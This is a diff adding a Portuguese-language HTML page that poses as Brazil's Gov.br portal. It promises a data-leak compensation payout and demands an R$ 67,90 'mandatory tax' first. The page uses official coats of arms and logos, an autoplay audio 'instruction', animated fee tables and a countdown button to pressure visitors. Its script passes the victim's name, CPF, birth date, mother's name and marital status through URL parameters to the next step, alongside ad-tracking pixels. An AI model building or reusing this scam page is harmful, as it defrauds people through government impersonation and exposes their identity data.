@@ -1,0 +1,588 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprovante de Recebimento - Gov.br</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- User Data Manager -->
+    <script src="../../js/user-data-manager.js"></script>
+    <script src="../../js/utmify-config.js"></script>
+    <script src="../../js/utmify-setup.js"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="icon" href="images/960px-Canal_Gov_Logo.png" type="image/png">
+    <script>
+  window.googlePixelId = "69702546258311df42737496";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <style>
+      .gov-green { background-color: #168821; }
+      .gov-text { color: #071D41; }
+      .comprovante-container {
+        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      }
+      .success-animation {
+        animation: pulse 2s infinite;
+      }
+      @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
+      }
+      .typewriter-active::after {
+        content: '|';
+        animation: blink 1s infinite;
+      }
+      @keyframes blink {
+        0%, 50% { opacity: 1; }
+        51%, 100% { opacity: 0; }
+      }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Header Gov.br -->
+    <header class="bg-white border-b border-gray-200 px-3 py-4">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center">
+                <img alt="gov.br" loading="lazy" width="120" height="40" decoding="async" data-nimg="1" class="h-8 w-auto" src="images/960px-Canal_Gov_Logo.png" style="color: transparent;">
+            </div>
+            <div class="flex items-center gap-4">
+                <div class="relative">
+                    <button class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center hover:bg-blue-700 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2" onclick="toggleDropdown()" aria-label="Perfil do usuário">
+                        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+                        </svg>
+                    </button>
+                    
+                    <div id="user-dropdown" class="hidden absolute right-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50">
+                        <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
+                            <i class="fas fa-user mr-2"></i>Meu Perfil
+                        </a>
+                        <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
+                            <i class="fas fa-cog mr-2"></i>Configurações
+                        </a>
+                        <hr class="my-1">
+                        <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
+                            <i class="fas fa-sign-out-alt mr-2"></i>Sair
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="px-0 md:px-1 py-4 md:flex md:justify-center md:items-start md:pt-8">
+        <div class="bg-white rounded-none md:rounded-lg shadow-none md:shadow-sm border-0 md:border border-gray-200 p-3 mx-0 md:mx-1 md:max-w-4xl w-full">
+            <div class="text-center mb-8">
+                <h1 class="text-2xl font-bold text-gray-800 mb-2">Confirmação do Processo</h1>
+                <p class="text-gray-600 mb-4" data-review-instruction="" id="review-instruction">João Silva, revise as informações antes de finalizar o saque</p>
+                <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
+                    <p class="text-sm text-green-700 mb-1">Valor para saque:</p>
+                    <p class="text-3xl font-bold text-green-600">R$ 5.960,50</p>
+                    <p class="text-sm text-green-600 mt-1" id="comprovante-cpf">CPF: 123.456.789-00</p>
+                </div>
+            </div>
+
+            <div class="mb-8">
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <svg class="w-6 h-6 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.82L4.29 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.29l4.093-3.82a1 1 0 011.617.82zM12 8a1 1 0 012 0v4a1 1 0 11-2 0V8z" clip-rule="evenodd"></path>
+                            <path d="M16.707 5.293a1 1 0 010 1.414A5.972 5.972 0 0118 10a5.972 5.972 0 01-1.293 3.293 1 1 0 11-1.414-1.414A3.972 3.972 0 0016 10c0-.8-.21-1.55-.586-2.207a1 1 0 011.414-1.414z"></path>
+                        </svg>
+                        <h3 class="text-lg font-semibold text-blue-800">Instruções Importantes</h3>
+                    </div>
+                    <p class="text-blue-700 text-sm mb-4">Ouça as instruções antes de prosseguir com a finalização:</p>
+                    <div class="bg-white rounded-lg p-4 border border-blue-200">
+                        <audio controls="" autoplay="" class="w-full" preload="auto">
+                            <source src="media/indeniza02.mp3" type="audio/mpeg">
+                            Seu navegador não suporta o elemento de áudio.
+                        </audio>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mb-8">
+                <div class="bg-gray-50 border border-gray-200 rounded-lg p-6" style="overflow: visible;">
+                    <div class="flex items-center gap-3 mb-4">
+                        <svg class="w-6 h-6 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd"></path>
+                        </svg>
+                        <h3 class="text-lg font-semibold text-gray-800">Seu Comprovante</h3>
+                    </div>
+                    <p class="text-gray-600 text-sm mb-4">Comprovante oficial do processo (clique para ampliar):</p>
+                    <div class="bg-white rounded-lg border border-gray-300 p-2" style="overflow: visible;">
+                        <div class="relative">
+                            <!-- Comprovante Incorporado -->
+                            <div class="bg-[#f6f6f1] rounded-2xl p-2" style="transform: scale(0.8); transform-origin: top left; width: 125%; height: auto; overflow: visible;">
+                                <!-- Header do Comprovante -->
+                                <div class="flex items-center border border-gray-400 rounded-lg p-2 mb-3 bg-white">
+                                    <img alt="Brasão da República" class="w-16 h-16 object-contain" src="images/brasaooficialcolorido.png">
+                                    <div class="flex-1 flex items-center justify-center">
+                                        <img alt="Logo gov.br" class="max-w-[5rem] max-h-8 object-contain" src="images/1200px-Gov.br_logo.svg.png">
+                                    </div>
+                                    <div class="text-[#1f2a44] text-right font-semibold text-sm leading-tight">
+                                        <p>Indenização</p>
+                                        <p>Governamental</p>
+                                    </div>
+                                </div>
+                                
+                                <!-- Nome Completo -->
+                                <label class="block text-xs text-gray-800 mb-1">Nome Completo</label>
+                                <input class="w-full border border-gray-400 rounded-md px-3 py-2 font-bold text-sm text-gray-900 mb-3 bg-white cursor-not-allowed" readonly="" type="text" value="JOÃO SILVA" id="comprovanteNome" data-user-fullname-uppercase="">
+                                
+                                <!-- Info boxes -->
+                                <div class="flex gap-2 mb-3">
+                                    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+                                        <label class="block text-xs text-gray-800 mb-1">Indenização a Receber</label>
+                                        <p class="font-extrabold text-sm text-gray-900">R$ 67,90</p>
+                                    </div>
+                                    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+                                        <label class="block text-xs text-gray-800 mb-1">Data de Emissão</label>
+                                        <p class="text-gray-900 text-xs">06/08/2025</p>
+                                    </div>
+                                    <div class="flex-1 border border-gray-400 rounded-md p-2 bg-white">
+                                        <label class="block text-xs text-gray-800 mb-1">Vencimento</label>
+                                        <p class="text-gray-900 text-xs">06/08/2025</p>
+                                    </div>
+                                </div>
+                                
+                                <!-- Table container (versão simplificada) -->
+                                <div class="border border-gray-400 rounded-lg bg-white p-2 mb-2">
+                                    <div class="flex justify-between items-center mb-2">
+                                        <h2 class="bg-[#5f758a] text-white font-semibold text-xs rounded-md px-2 py-1">Indenização a Receber</h2>
+                                        <div class="text-right text-xs text-gray-900">
+                                            <p>Imposto obrigatório:</p>
+                                            <p class="font-extrabold text-sm">R$ 67,90</p>
+                                        </div>
+                                    </div>
+                                    <p class="font-bold text-xs mb-1">Vazamento de Dados Pessoais</p>
+                                    <p class="text-xs text-gray-900 leading-tight mb-2">Laudo técnico pericial comprovou o vazamento indevido de seus dados pessoais.</p>
+                                    
+                                    <!-- Tabela simplificada -->
+                                    <div class="text-xs border border-gray-300 rounded">
+                                        <div class="bg-gray-100 p-1 border-b font-bold">Detalhamento dos Valores</div>
+                                        <div class="grid grid-cols-4 gap-1 p-1 border-b font-bold bg-gray-50">
+                                            <div>Dado Pessoal</div>
+                                            <div class="text-right">Multa</div>
+                                            <div class="text-right">Juros</div>
+                                            <div class="text-right">Total</div>
+                                        </div>
+                                        <div class="grid grid-cols-4 gap-1 p-1" id="linha1" style="opacity: 0;">
+                                            <div>NOME COMPLETO</div>
+                                            <div class="text-right typewriter-multa1"></div>
+                                            <div class="text-right typewriter-juros1"></div>
+                                            <div class="text-right typewriter-total1"></div>
+                                        </div>
+                                        <div class="grid grid-cols-4 gap-1 p-1" id="linha2" style="opacity: 0;">
+                                            <div>CPF</div>
+                                            <div class="text-right typewriter-multa2"></div>
+                                            <div class="text-right typewriter-juros2"></div>
+                                            <div class="text-right typewriter-total2"></div>
+                                        </div>
+                                        <div class="grid grid-cols-4 gap-1 p-1" id="linha3" style="opacity: 0;">
+                                            <div>RG</div>
+                                            <div class="text-right typewriter-multa3"></div>
+                                            <div class="text-right typewriter-juros3"></div>
+                                            <div class="text-right typewriter-total3"></div>
+                                        </div>
+                                        <div class="grid grid-cols-4 gap-1 p-1" id="linha4" style="opacity: 0;">
+                                            <div>RENDA MENSAL</div>
+                                            <div class="text-right typewriter-multa4"></div>
+                                            <div class="text-right typewriter-juros4"></div>
+                                            <div class="text-right typewriter-total4"></div>
+                                        </div>
+                                        <div class="grid grid-cols-4 gap-1 p-1 border-t font-bold" id="linha5" style="opacity: 0;">
+                                            <div>Total Geral</div>
+                                            <div></div>
+                                            <div></div>
+                                            <div class="text-right typewriter-total-geral"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Protocolo -->
+                                <div class="flex justify-between items-center border-t border-gray-400 pt-1 text-xs text-gray-900">
+                                    <p>Protocolo: 202506030987-BR</p>
+                                    <div class="w-12 h-12 bg-gray-200 rounded border"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="text-center">
+                <button id="finalizeButton" disabled="" class="w-full py-4 px-6 rounded-full font-bold text-lg transition-all duration-300 flex items-center justify-center gap-2 bg-gray-400 text-white cursor-not-allowed opacity-75">
+                    <div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    Aguarde <span id="countdown">18</span>s
+                </button>
+            </div>
+
+            <div class="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
+                <div class="flex items-center gap-2 mb-2">
+                    <svg class="w-5 h-5 text-yellow-600" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                    </svg>
+                    <h3 class="font-semibold text-yellow-800">Atenção</h3>
+                </div>
+                <p class="text-yellow-700 text-sm">Certifique-se de ter ouvido as instruções no áudio e verificado o comprovante antes de finalizar o processo. Após clicar em "FINALIZAR SAQUE", o processo será concluído.</p>
+            </div>
+        </div>
+    </main>
+
+    <script>
+      // Função para atualizar dados do usuário na página comprovante
+      function updateUserData() {
+        console.log('🔍 Carregando dados do usuário na página comprovante/index.html...');
+        
+        // PRIORIDADE 1: Verificar dados na URL
+        const urlParams = new URLSearchParams(window.location.search);
+        let userData = null;
+        
+        if (urlParams.has('nome') || urlParams.has('cpf')) {
+          userData = {
+            nome: urlParams.get('nome'),
+            cpf: urlParams.get('cpf'),
+            nascimento: urlParams.get('nascimento'),
+            nomeMae: urlParams.get('nomeMae'),
+            estadoCivil: urlParams.get('estadoCivil'),
+            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+          };
+          console.log('✅ Dados encontrados na URL:', userData);
+        }
+        
+        // PRIORIDADE 2: Tentar user-data-manager
+        if (!userData && typeof window.getUserData === 'function') {
+          try {
+            userData = window.getUserData();
+            console.log('✅ Dados obtidos via getUserData:', userData);
+          } catch (error) {
+            console.log('❌ Erro getUserData:', error);
+          }
+        }
+        
+        // PRIORIDADE 3: SessionStorage
+        if (!userData) {
+          const sessionData = sessionStorage.getItem('userData');
+          if (sessionData) {
+            try {
+              userData = JSON.parse(sessionData);
+              console.log('✅ Dados obtidos via sessionStorage:', userData);
+            } catch (error) {
+              console.log('❌ Erro ao parsear sessionStorage:', error);
+            }
+          }
+        }
+        
+        // Atualizar elementos da página
+        if (userData && userData.nome) {
+          // Atualizar saudação
+          const reviewInstruction = document.getElementById('review-instruction');
+          if (reviewInstruction) {
+            reviewInstruction.textContent = `${userData.nome}, revise as informações antes de finalizar o saque`;
+            console.log('✅ Saudação atualizada para:', userData.nome);
+          }
+          
+          // Atualizar CPF se disponível
+          if (userData.cpf) {
+            const cpfElement = document.getElementById('comprovante-cpf');
+            if (cpfElement) {
+              cpfElement.textContent = `CPF: ${userData.cpf}`;
+              console.log('✅ CPF atualizado para:', userData.cpf);
+            }
+          }
+          
+          // Atualizar nome no comprovante incorporado
+          const comprovanteNome = document.getElementById('comprovanteNome');
+          if (comprovanteNome) {
+            comprovanteNome.value = userData.nome.toUpperCase();
+            console.log('✅ Nome no comprovante atualizado para:', userData.nome.toUpperCase());
+          }
+        } else {
+          console.log('⚠️ Nenhum dado de usuário encontrado - usando dados padrão');
+        }
+      }
+
+      // Função para controlar o dropdown do usuário
+      function toggleDropdown() {
+        const dropdown = document.getElementById('user-dropdown');
+        dropdown.classList.toggle('hidden');
+      }
+
+      // Função para abrir comprovante em tela cheia
+      function openComprovante() {
+        console.log('🚀 Abrindo comprovante...');
+        
+        // Obter dados reais da URL atual
+        const urlParams = new URLSearchParams(window.location.search);
+        let userData = null;
+        let userName = 'João Silva'; // fallback
+        
+        // Tentar obter dados completos
+        if (urlParams.has('nome') || urlParams.has('cpf')) {
+          userData = {
+            nome: urlParams.get('nome'),
+            cpf: urlParams.get('cpf'),
+            nascimento: urlParams.get('nascimento'),
+            nomeMae: urlParams.get('nomeMae'),
+            estadoCivil: urlParams.get('estadoCivil'),
+            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+          };
+          userName = userData.nome || userName;
+          console.log('✅ Dados completos obtidos da URL:', userData);
+        } else if (typeof window.getUserFullName === 'function') {
+          const userDataName = window.getUserFullName();
+          if (userDataName && userDataName !== 'Silvio Santos Silva') {
+            userName = userDataName;
+            console.log('✅ Nome obtido via getUserFullName:', userName);
+          }
+        }
+        
+        // Construir URL com todos os dados disponíveis
+        const params = new URLSearchParams();
+        params.set('nome', userName);
+        
+        if (userData) {
+          if (userData.cpf) params.set('cpf', userData.cpf);
+          if (userData.nascimento) params.set('nascimento', userData.nascimento);
+          if (userData.nomeMae) params.set('nomeMae', userData.nomeMae);
+          if (userData.estadoCivil) params.set('estadoCivil', userData.estadoCivil);
+          if (userData.nomeCompleto) params.set('nomeCompleto', userData.nomeCompleto);
+        }
+        
+        // Preservar UTMs
+        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(utm => {
+          if (urlParams.has(utm)) {
+            params.set(utm, urlParams.get(utm));
+          }
+        });
+        
+        window.open(`comprovante.html?${params.toString()}`, '_blank');
+      }
+
+      // Função para finalizar processo
+      function finalizeProcess() {
+        // Mostrar confirmação antes de redirecionar
+        if (confirm('Tem certeza que deseja finalizar o saque? Esta ação não pode ser desfeita.')) {
+          console.log('🚀 Redirecionando para finalização...');
+          
+          // Obter dados da URL atual para propagar
+          const urlParams = new URLSearchParams(window.location.search);
+          let userData = null;
+          
+          if (urlParams.has('nome') || urlParams.has('cpf')) {
+            userData = {
+              nome: urlParams.get('nome'),
+              cpf: urlParams.get('cpf'),
+              nascimento: urlParams.get('nascimento'),
+              nomeMae: urlParams.get('nomeMae'),
+              estadoCivil: urlParams.get('estadoCivil'),
+              nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
+            };
+            console.log('🔗 Dados encontrados na URL para propagar:', userData);
+          }
+          
+          // Construir URL com dados
+          let targetURL = '../finalizacao/index.html';
+          
+          if (userData) {
+            const params = new URLSearchParams();
+            
+            // Adicionar dados do usuário
+            if (userData.nome) params.set('nome', userData.nome);
+            if (userData.cpf) params.set('cpf', userData.cpf);
+            if (userData.nascimento) params.set('nascimento', userData.nascimento);
+            if (userData.nomeMae) params.set('nomeMae', userData.nomeMae);
+            if (userData.estadoCivil) params.set('estadoCivil', userData.estadoCivil);
+            if (userData.nomeCompleto) params.set('nomeCompleto', userData.nomeCompleto);
+            
+            // Preservar UTMs
+            ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'].forEach(utm => {
+              if (urlParams.has(utm)) {
+                params.set(utm, urlParams.get(utm));
+              }
+            });
+            
+            if (params.toString()) {
+              targetURL += '?' + params.toString();
+            }
+            
+            console.log('🔗 URL com dados:', targetURL);
+          }
+          
+          // Redirecionar para finalizacao
+          if (typeof window.addUTMsToURL === 'function' && !userData) {
+            // Usar função de navegação com UTMs se disponível (sem dados)
+            window.location.href = window.addUTMsToURL('../finalizacao/index.html');
+          } else {
+            // Usar URL com dados ou fallback simples
+            window.location.href = targetURL;
+          }
+        }
+      }
+
+      // Função para animar a digitação dos valores
+      function startTypingAnimation() {
+        const linhas = [
+          { 
+            id: 'linha1', 
+            multa: '25,40', 
+            juros: '8,25', 
+            total: '33,65',
+            multaClass: 'typewriter-multa1',
+            jurosClass: 'typewriter-juros1', 
+            totalClass: 'typewriter-total1'
+          },
+          { 
+            id: 'linha2', 
+            multa: '15,35', 
+            juros: '5,90', 
+            total: '21,25',
+            multaClass: 'typewriter-multa2',
+            jurosClass: 'typewriter-juros2', 
+            totalClass: 'typewriter-total2'
+          },
+          { 
+            id: 'linha3', 
+            multa: '8,10', 
+            juros: '1,40', 
+            total: '9,50',
+            multaClass: 'typewriter-multa3',
+            jurosClass: 'typewriter-juros3', 
+            totalClass: 'typewriter-total3'
+          },
+          { 
+            id: 'linha4', 
+            multa: '2,95', 
+            juros: '0,55', 
+            total: '3,50',
+            multaClass: 'typewriter-multa4',
+            jurosClass: 'typewriter-juros4', 
+            totalClass: 'typewriter-total4'
+          },
+          { 
+            id: 'linha5', 
+            total: 'R$ 67,90',
+            totalClass: 'typewriter-total-geral'
+          }
+        ];
+
+        let currentIndex = 0;
+
+        function typeNextLine() {
+          if (currentIndex < linhas.length) {
+            const current = linhas[currentIndex];
+            const element = document.getElementById(current.id);
+            
+            // Mostrar o elemento
+            element.style.opacity = '1';
+            
+            // Animar a digitação para linha de total geral
+            if (currentIndex === 4) {
+              const totalSpan = element.querySelector('.' + current.totalClass);
+              typeText(totalSpan, current.total, () => {
+                currentIndex++;
+                setTimeout(typeNextLine, 500);
+              });
+            } else {
+              // Animar multa, juros e total sequencialmente
+              const multaSpan = element.querySelector('.' + current.multaClass);
+              const jurosSpan = element.querySelector('.' + current.jurosClass);
+              const totalSpan = element.querySelector('.' + current.totalClass);
+              
+              typeText(multaSpan, current.multa, () => {
+                setTimeout(() => {
+                  typeText(jurosSpan, current.juros, () => {
+                    setTimeout(() => {
+                      typeText(totalSpan, current.total, () => {
+                        currentIndex++;
+                        setTimeout(typeNextLine, 800);
+                      });
+                    }, 300);
+                  });
+                }, 300);
+              });
+            }
+          }
+        }
+
+        function typeText(element, text, callback) {
+          let charIndex = 0;
+          element.classList.add('typewriter-active');
+          const typeInterval = setInterval(() => {
+            element.textContent = text.substring(0, charIndex + 1);
+            charIndex++;
+            
+            if (charIndex >= text.length) {
+              clearInterval(typeInterval);
+              element.classList.remove('typewriter-active');
+              if (callback) callback();
+            }
+          }, 80);
+        }
+
+        typeNextLine();
+      }
+
+      // Configurações quando a página carregar
+      document.addEventListener('DOMContentLoaded', function() {
+        // Atualizar dados do usuário primeiro
+        updateUserData();
+        
+        // Iniciar efeito de digitação nos valores
+        setTimeout(function() {
+          startTypingAnimation();
+        }, 2000); // Inicia após 2 segundos
+
+        // Iniciar contador regressivo para o botão
+        let countdown = 18;
+        const button = document.getElementById('finalizeButton');
+        const countdownElement = document.getElementById('countdown');
+        
+        const timer = setInterval(function() {
+          countdown--;
+          countdownElement.textContent = countdown;
+          
+          if (countdown <= 0) {
+            clearInterval(timer);
+            
+            // Habilitar o botão após 18 segundos
+            button.disabled = false;
+            button.onclick = finalizeProcess;
+            button.className = 'w-full py-4 px-6 rounded-full font-bold text-lg transition-all duration-300 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white transform hover:scale-105 cursor-pointer';
+            button.innerHTML = `
+              <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+              </svg>
+              FINALIZAR SAQUE
+            `;
+          }
+        }, 1000);
+
+        // Fechar dropdown ao clicar fora
+        document.addEventListener('click', function(event) {
+          const dropdown = document.getElementById('user-dropdown');
+          const userButton = document.querySelector('[aria-label="Perfil do usuário"]');
+          
+          if (dropdown && userButton && 
+              !dropdown.contains(event.target) && 
+              !userButton.contains(event.target)) {
+            dropdown.classList.add('hidden');
+          }
+        });
+
+        // Adicionar efeito de sucesso
+        setTimeout(function() {
+          console.log('🎉 Processo de saque confirmado!');
+        }, 1000);
+      });
+    </script>
+
+
+</body></html>
